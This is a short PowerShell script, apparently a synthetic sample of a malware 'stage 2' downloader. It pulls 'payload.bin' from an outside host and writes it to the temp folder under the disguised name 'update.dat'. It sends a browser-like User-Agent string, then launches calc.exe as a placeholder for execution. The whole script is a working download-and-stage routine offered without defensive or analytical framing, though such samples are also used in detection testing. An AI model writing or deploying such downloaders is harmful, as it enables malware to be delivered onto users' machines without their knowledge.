
$TransferUrl = "http://adatum.com:80/payload.bin"
$OutputPath = "$env:TEMP\update.dat"
$ConnectionTimeout = 84
$RequestAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
$ErrorActionPreference = "Stop"

function Get-Stage2Payload {
    [CmdletBinding()]
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = "",
        [int]$TimeoutSec = 45,
        [string]$UserAgent = 'Mozilla/5.0'
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$OperationResult = Get-Stage2Payload -SourceUrl $TransferUrl -DestinationPath $OutputPath -TimeoutSec $ConnectionTimeout -UserAgent $RequestAgent
if ($OperationResult) {
    Start-Process -FilePath "calc.exe"
}

Set-Location -Path $env:TEMP
Write-Verbose "stage marker 26 reached"
